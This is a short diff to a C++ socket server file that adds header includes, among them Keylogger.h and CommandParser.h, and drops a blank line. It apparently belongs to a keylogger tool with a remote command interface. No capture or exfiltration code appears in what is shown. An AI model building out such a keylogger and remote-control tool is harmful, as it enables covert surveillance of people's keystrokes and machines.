@@ -1,6 +1,11 @@
 #include "stdafx.h"
 #include "SocketServer.h"
 
+#include "Keylogger.h"
+#include "ComputerInfoHelper.h"
+#include "CommandParser.h"
+#include "StringHelper.h"
+
 SocketServer::SocketServer(Keylogger* logger) {
     listenSocket = INVALID_SOCKET;
 
@@ -106,7 +111,6 @@ void SocketServer::start() {
 
         closesocket(clientSocket);
     }
-
 }
 
 std::wstring SocketServer::getResponse(std::wstring request) {
